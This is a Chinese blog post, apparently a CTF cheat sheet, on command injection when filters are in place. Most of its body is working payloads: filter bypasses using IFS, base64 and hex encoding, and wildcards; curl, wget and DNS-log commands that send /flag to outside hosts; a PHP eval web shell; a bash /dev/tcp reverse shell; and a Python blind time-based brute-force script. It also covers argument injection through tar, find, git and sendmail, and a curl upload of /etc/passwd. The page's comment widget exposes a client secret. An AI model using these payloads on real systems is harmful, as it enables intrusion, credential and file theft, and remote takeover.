@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>存在限制的shell命令执行 - M1N&#39;s Blog</title>
+    <meta charset="UTF-8">
+    <meta name="description" content="M1N的博客">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    
+
+    <link rel="shortcut icon" href="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png" />
+    <meta name="description" content="截断符;,|,||,&amp;&amp; |表示管道，上一条命令的输出，作为下一条命令参数(输入) || 表示上一条命令执行失败后，才执行下一条命令 &amp;&amp;表示前一条命令执行成功时，才执行后一条命令 &amp;表示任务在后台执行,如java -jar test.jar &gt; log.txt &amp;，同时，放在两个命令之间时两个都会执行，第一个命令后台执行 %0a换行符 %0d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="存在限制的shell命令执行">
+<meta property="og:url" content="http://blog.m1n.me/2020/07/09/%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="M1N&#39;s Blog">
+<meta property="og:description" content="截断符;,|,||,&amp;&amp; |表示管道，上一条命令的输出，作为下一条命令参数(输入) || 表示上一条命令执行失败后，才执行下一条命令 &amp;&amp;表示前一条命令执行成功时，才执行后一条命令 &amp;表示任务在后台执行,如java -jar test.jar &gt; log.txt &amp;，同时，放在两个命令之间时两个都会执行，第一个命令后台执行 %0a换行符 %0d">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-07-09T09:01:12.000Z">
+<meta property="article:modified_time" content="2021-09-20T16:11:46.831Z">
+<meta property="article:author" content="M1N">
+<meta name="twitter:card" content="summary">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
+    <link rel="stylesheet" href="/css/style.css?v=1632154647062">
+     
+    
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1632154647062">
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="mdui-drawer-body-left">
+    
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/4.jpg)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="M1N" class="mdui-btn mdui-btn-icon"><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" alt="M1N"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="M1N">
+            <img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" alt="M1N" alt="M1N">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>8</div>
+        <div><span>标签</span>0</div>
+        <div><span>分类</span>4</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:m1n.me" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-social">
+        
+    </div>
+</div>
+    
+    
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Bypass/">Bypass</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/SQL-Injection/">SQL注入</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Writeup/">Writeup</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/文件上传/">文件上传</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+    
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2021 M1N
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+      
+          <div class="nexmoe-post-cover" style="padding-bottom: NaN%;"> 
+              <img data-src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/3.jpg" data-sizes="auto" alt="存在限制的shell命令执行" class="lazyload">
+              <h1>存在限制的shell命令执行</h1>
+          </div>
+      
+      
+      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2020年07月09日</a>
+    <a><i class="nexmoefont icon-areachart"></i>894 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 4 分钟</a>
+</div>
+
+      
+
+      <h1 id="截断符-amp-amp"><a href="#截断符-amp-amp" class="headerlink" title="截断符;,|,||,&amp;&amp;"></a>截断符<code>;</code>,<code>|</code>,<code>||</code>,<code>&amp;&amp;</code></h1><ol>
+<li><code>|</code>表示管道，上一条命令的输出，作为下一条命令参数(输入)</li>
+<li><code>||</code> 表示上一条命令执行失败后，才执行下一条命令</li>
+<li><code>&amp;&amp;</code>表示前一条命令执行成功时，才执行后一条命令</li>
+<li><code>&amp;</code>表示任务在后台执行,如<code>java -jar test.jar &gt; log.txt &amp;</code>，同时，放在两个命令之间时两个都会执行，第一个命令后台执行</li>
+<li><code>%0a</code>换行符</li>
+<li><code>%0d</code>回车符</li>
+<li><code>;</code></li>
+</ol>
+<h1 id="shell存在部分过滤"><a href="#shell存在部分过滤" class="headerlink" title="shell存在部分过滤"></a>shell存在部分过滤</h1><ol>
+<li><p>过滤了空格</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$IFS</span><br><span class="hljs-variable">$&#123;IFS&#125;</span><br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span> <span class="hljs-regexp">//</span><span class="hljs-variable">$1</span>改成$加其他数字貌似都行<br>&lt; <br>&lt;&gt; <br>&#123;cat,flag.php&#125;  <span class="hljs-regexp">//</span>用逗号实现了空格功能<br>%<span class="hljs-number">20</span><br>%<span class="hljs-number">09</span><br>kg=$<span class="hljs-string">&#x27;\x20/flag&#x27;</span>&amp;&amp;cat<span class="hljs-variable">$kg</span> <span class="hljs-regexp">//</span>\x20变成了空格<br>\t和\r和\n代替空格<br></code></pre></td></tr></table></figure></li>
+<li><p>过滤了部分关键词</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">拼接实现绕过：a=l;b=s;<span class="hljs-keyword">$a$b</span><br><span class="hljs-keyword">引号、反斜杠绕过：ca&#x27;&#x27;t    ca&quot;&quot;t  ca\t</span><br><span class="hljs-keyword">特殊变量绕过：ca#@t  ca#*t</span><br><span class="hljs-keyword">编码绕过：echo Y2F0IC9mbGFn|base64 -d|bash</span><br><span class="hljs-keyword">		echo &quot;636174202f666c6167&quot; | xxd -r -p|bash（hex编码）</span><br><span class="hljs-keyword">		$</span>(printf &quot;<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>6c<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>67&quot;)<br>		&#123;printf,&quot;<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>6c<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>67&quot;&#125;|bash<br>		当bash也被禁时，可以试试sh<br>通配符绕过：fl*   fla?   fla[0-z]  fla[123hg]  fla&#123;1,2,3,g&#125; <br>		一些常用的通配符：<br>			* 匹配任意个数的字符<br>			? 匹配一个字符<br>			[list] 匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合<br>			[^list] 匹配指定范围外的任意单个字符或字符集合<br>			[!list] 和[^list]一样<br>			&#123;1,2,&#125; 逐一匹配<br></code></pre></td></tr></table></figure></li>
+<li><p>过滤<code>/</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> `expr substr <span class="hljs-variable">$</span>(<span class="hljs-built_in">pwd</span>) <span class="hljs-number">1</span> <span class="hljs-number">1</span>`flag<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h1><p>文章：’<a target="_blank" rel="noopener" href="https://250.ac.cn/2018/12/18/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%88%A9%E7%94%A8/">https://250.ac.cn/2018/12/18/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%88%A9%E7%94%A8/</a>‘</p>
+<h3 id="服务器可以访问外网"><a href="#服务器可以访问外网" class="headerlink" title="服务器可以访问外网"></a>服务器可以访问外网</h3><ol>
+<li><p>curl ：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span>**.**.**.**<span class="hljs-regexp">/index.php?jingzhe=`cat /</span>flag`<br>curl -d `cat <span class="hljs-regexp">/flag|base64` http:/</span><span class="hljs-regexp">/example.com</span><br></code></pre></td></tr></table></figure></li>
+<li><p>wget:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>**.**.**.**<span class="hljs-regexp">/index.php?jingzhe=`cat /</span>flag`<br></code></pre></td></tr></table></figure></li>
+<li><p>DNSlog:</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping `cat /flag`.aaaaaa.ceye.io<br></code></pre></td></tr></table></figure></li>
+<li><p>写shell：</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">echo &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; &gt; aaa.php</span><br></code></pre></td></tr></table></figure></li>
+<li><p>反弹shell</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>bash -c <span class="hljs-string">&quot;sh &gt;&amp; /dev/tcp/0.0.0.0/80 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="服务器无法访问外网"><a href="#服务器无法访问外网" class="headerlink" title="服务器无法访问外网"></a>服务器无法访问外网</h3><p>爆破，EXP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8 -*-import requestsimport reflag_format = re.compile(&#x27;flag\\&#123;[0-9a-z]&#123;8&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;12&#125;\\&#125;&#x27;)all_letter = &#x27;-&#125;0123456789abcdefghijklmnopqrstuvwxyz&#x27;def get_flag(command):    try:        r = requests.get(&#x27;http://web.train.lilac.com:10008/&#x27;, params=&#123;&#x27;command&#x27;: command&#125;, timeout=1.5)    except:        return True    return Falseif __name__ == &#x27;__main__&#x27;:    flag = &#x27;flag&#123;&#x27;    while flag_format.match(flag) == None:        staus = 0        for i in all_letter:            payload = &#x27;| cat /flag | grep %s &amp;&amp; sleep 1.8&#x27; % (flag + i)            print(payload)            if get_flag(payload):                staus = 1                flag += i                print(flag)                break        if staus == 0:            flag = flag[0:-1]</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/107336">https://www.anquanke.com/post/id/107336</a></p>
+<ol>
+<li><p>tar</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">tar --<span class="hljs-keyword">use</span>-<span class="hljs-keyword">compress</span>-<span class="hljs-keyword">program</span>=&#x27;<span class="hljs-keyword">cat</span> /etc/passwd&#x27; -<span class="hljs-keyword">cf</span> 2.tar *<span class="hljs-keyword">cat</span> 2.tar<br></code></pre></td></tr></table></figure></li>
+<li><p>find</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> . -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> 命令 \; -quitfind . -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> cat /etc/passwd \; -quitfind . -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">echo</span> hello \; -quit<br></code></pre></td></tr></table></figure></li>
+<li><p>git</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">git <span class="hljs-keyword">grep</span> -i --<span class="hljs-built_in">line</span>-<span class="hljs-keyword">number</span> -<span class="hljs-keyword">e</span> <span class="hljs-string">&#x27;--open-files-in-pager=命令;&#x27;</span> master<br></code></pre></td></tr></table></figure></li>
+<li><p>wget</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">$url = &#x27;--<span class="hljs-built_in">directory</span>-<span class="hljs-built_in">prefix</span>=/<span class="hljs-built_in">var</span>/www/html http://<span class="hljs-built_in">example</span>.com/<span class="hljs-built_in">example</span>.php&#x27;;<span class="hljs-built_in">system</span>(escapeshellcmd(&#x27;wget &#x27;.$url));<br></code></pre></td></tr></table></figure></li>
+<li><p>sendmail</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sendmail -t -i -f <span class="hljs-keyword">from</span>@sth.com -C<span class="hljs-regexp">/etc/</span>passwd -X<span class="hljs-regexp">/tmp/</span>output.txt &lt; mail.txt<br></code></pre></td></tr></table></figure></li>
+<li><p>curl</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -F password=@<span class="hljs-regexp">/etc/</span>passwd http:<span class="hljs-regexp">//</span>example.com<br></code></pre></td></tr></table></figure></li>
+<li><p>mysql</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">mysql -uuser -ppassword -e  \! 命令<br></code></pre></td></tr></table></figure></li>
+<li><p>untar</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">$zip_name = <span class="hljs-string">&#x27;-d /var/www/html archive.zip&#x27;</span>;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;unzip -j &#x27;</span>.escapeshellarg($zip_name).<span class="hljs-string">&#x27; *.tmp -d /tmp&#x27;</span>);<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ln</span> -s /etc/passwd <span class="hljs-number">222222</span>.jpgtar cvfp <span class="hljs-number">1</span>.tar <span class="hljs-number">222222</span>.jpg<br></code></pre></td></tr></table></figure>
+
+<h1 id="长度限制注入"><a href="#长度限制注入" class="headerlink" title="长度限制注入"></a>长度限制注入</h1><p><a target="_blank" rel="noopener" href="https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a></p>
+<p>例：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">&gt;ls<span class="hljs-symbol">\\</span>ls&gt;_&gt;<span class="hljs-symbol">\ </span><span class="hljs-symbol">\\</span>&gt;-t<span class="hljs-symbol">\\</span>&gt;<span class="hljs-symbol">\&gt;</span>gls&gt;&gt;_<br></code></pre></td></tr></table></figure>
+
+<h1 id="grep大法"><a href="#grep大法" class="headerlink" title="grep大法"></a>grep大法</h1><p><code>grep -ri . flag</code></p>
+
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>M1N<br>
+        <strong>本文链接：</strong><a href="http://blog.m1n.me/2020/07/09/%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="http:&#x2F;&#x2F;blog.m1n.me&#x2F;2020&#x2F;07&#x2F;09&#x2F;%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;blog.m1n.me&#x2F;2020&#x2F;07&#x2F;09&#x2F;%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+    
+        <a class="nexmoefont icon-appstore-fill -link" href="/categories/Bypass/">Bypass</a>
+    
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'm1nme.github.io',
+        owner: 'm1nme',
+        admin: 'm1nme'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%AA%E6%96%AD%E7%AC%A6-amp-amp"><span class="toc-number">1.</span> <span class="toc-text">截断符;,|,||,&amp;&amp;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shell%E5%AD%98%E5%9C%A8%E9%83%A8%E5%88%86%E8%BF%87%E6%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">shell存在部分过滤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">3.</span> <span class="toc-text">无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91"><span class="toc-number">3.0.1.</span> <span class="toc-text">服务器可以访问外网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91"><span class="toc-number">3.0.2.</span> <span class="toc-text">服务器无法访问外网</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">参数注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AF%E8%BF%9E%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">软连接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">长度限制注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#grep%E5%A4%A7%E6%B3%95"><span class="toc-number">7.</span> <span class="toc-text">grep大法</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+     
+    <div id="nexmoe-search-space">
+        <div class="search-container">
+            <div class="search-header">
+                <div class="search-input-container">
+                    <input class="search-input" type="text" placeholder="搜索" oninput="sinput();">
+                </div>
+                <a class="search-close" onclick="sclose();">×</a>
+            </div>
+            <div class="search-body"></div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+ 
+
+<script async src="/js/app.js?v=1632154647072"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
+<script>
+	$(".justified-gallery").justifiedGallery({
+		rowHeight: 160,
+		margins: 10,
+	});
+</script>
+
+
+    
+
+
+
+
+
+</body>
+
+</html>
